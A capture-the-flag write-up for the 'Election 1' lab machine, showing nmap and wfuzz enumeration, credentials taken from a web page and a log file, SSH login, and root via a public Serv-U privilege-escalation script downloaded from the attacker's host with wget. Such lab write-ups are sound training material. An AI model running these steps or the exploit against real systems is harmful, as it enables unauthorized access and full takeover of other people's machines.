---
layout: default
title: Election 1
parent: Proving Grounds Play
nav_order: 11
---

# Scanning

---

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/election1]
└─$ sudo nmap -Pn -p- -sC -sV -T4 --open 192.168.160.211
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-10 22:07 EST
Nmap scan report for 192.168.160.211
Host is up (0.065s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 20:d1:ed:84:cc:68:a5:a7:86:f0:da:b8:92:3f:d9:67 (RSA)
|   256 78:89:b3:a2:75:12:76:92:2a:f9:8d:27:c1:08:a7:b9 (ECDSA)
|_  256 b8:f4:d6:61:cf:16:90:c5:07:18:99:b0:7c:70:fd:c0 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

# Enumeration

---

## 80 | HTTP

### Directory Busting

WFuzz for files

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/driftingblues]
└─$ wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt --hc 404 "http://192
.168.160.211/FUZZ"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl
. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more informatio
n.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.160.211/FUZZ
Total requests: 37050

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000069:   200        375 L    964 W      10918 Ch    "index.html"
000000157:   403        9 L      28 W       280 Ch      ".htaccess"
000000248:   200        4 L      4 W        30 Ch       "robots.txt"
000000279:   200        1172 L   5873 W     95704 Ch    "phpinfo.php"
000000379:   200        375 L    964 W      10918 Ch    "."
000000537:   403        9 L      28 W       280 Ch      ".html"
000000806:   403        9 L      28 W       280 Ch      ".php"
000001564:   403        9 L      28 W       280 Ch      ".htpasswd"
000001830:   403        9 L      28 W       280 Ch      ".htm"
000002100:   403        9 L      28 W       280 Ch      ".htpasswds"
000004625:   403        9 L      28 W       280 Ch      ".htgroup"
000005172:   403        9 L      28 W       280 Ch      "wp-forum.phps"
```

Wfuzz for directories

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/driftingblues]
└─$ wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 "http://192.168.160.211/FUZZ"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.160.211/FUZZ
Total requests: 62284

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000139:   301        9 L      28 W       323 Ch      "javascript"
000000300:   301        9 L      28 W       323 Ch      "phpmyadmin"
000004255:   200        375 L    964 W      10918 Ch    "http://192.168.160.211/"
000004227:   403        9 L      28 W       280 Ch      "server-status"
000005666:   301        9 L      28 W       321 Ch      "election"
```

Robots.txt shows 4 entries

![robots](../../../assets/images/ctfs/proving_grounds/election1/robots.png)

Ran Gobuster against _/election_ directory and located _card.php_

![card](../../../assets/images/ctfs/proving_grounds/election1/card.png)

Decoded the binary code and revealed credentials

![creds](../../../assets/images/ctfs/proving_grounds/election1/creds.png)

Located the following credentials: 1234:Zxc123!@#
{: .warn}

Use the credentials to logon to the admin console discovered by Gobuster at _/election/admin_

![admin](../../../assets/images/ctfs/proving_grounds/election1/admin.png)

Deadend. Moving on to other directories found by Gobuster.

# Exploitation

---

We discover _/election/admin/logs_ and a _system.log_ file which provides credentials.

![logs](../../../assets/images/ctfs/proving_grounds/election1/logs.png)

Located the following credentials: love:P@$$w0rd@123
{: .warn }

We can use these credentials to authenticated to the SSH service on the target.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/election1]
└─$ ssh love@192.168.160.211
The authenticity of host '192.168.160.211 (192.168.160.211)' can't be established.
ED25519 key fingerprint is SHA256:z1Xg/pSBrK8rLIMLyeb0L7CS1YL4g7BgCK95moiAYhQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.160.211' (ED25519) to the list of known hosts.
love@192.168.160.211's password:
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 5.4.0-120-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

471 packages can be updated.
358 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Your Hardware Enablement Stack (HWE) is supported until April 2023.
Last login: Thu Apr  9 23:19:28 2020 from 192.168.1.5
love@election:~$ id
uid=1000(love) gid=1000(love) groups=1000(love),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare)

```

# Post-Exploitation

---

## SUID Permissions

```bash
love@election:~$ find / -perm -u=s -type f 2>/dev/null

/usr/bin/arping
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/traceroute6.iputils
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/sbin/pppd
/usr/local/Serv-U/Serv-U
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
```

## Exploit Serv-U Privesc Exploit

We locate the version of the Serv-U service as 15.1.6.25

![version](../../../assets/images/ctfs/proving_grounds/election1/version.png)

Checking searchsploit, there is a privesc shell script for Serv-U version under 15.1.

![searchsploit](../../../assets/images/ctfs/proving_grounds/election1/searchsploit.png)

Move the exploit to the target

```bash
love@election:/tmp$ wget http://192.168.45.217:8000/47173.sh
--2023-11-11 09:38:30--  http://192.168.45.217:8000/47173.sh
Connecting to 192.168.45.217:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1163 (1.1K) [text/x-sh]
Saving to: ‘47173.sh’

47173.sh            100%[===================>]   1.14K  --.-KB/s    in 0s

2023-11-11 09:38:30 (89.3 MB/s) - ‘47173.sh’ saved [1163/1163]

love@election:/tmp$ chmod +x 47173.sh
love@election:/tmp$ ./47173.sh
[*] Launching Serv-U ...
sh: 1: : Permission denied
[+] Success:
-rwsr-xr-x 1 root root 1113504 Nov 11 09:38 /tmp/sh
[*] Launching root shell: /tmp/sh
sh-4.4# id
uid=1000(love) gid=1000(love) euid=0(root) groups=1000(love),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare)
sh-4.4# whoami
root

```

After executing the Serv-U privesc script we have a root shell.
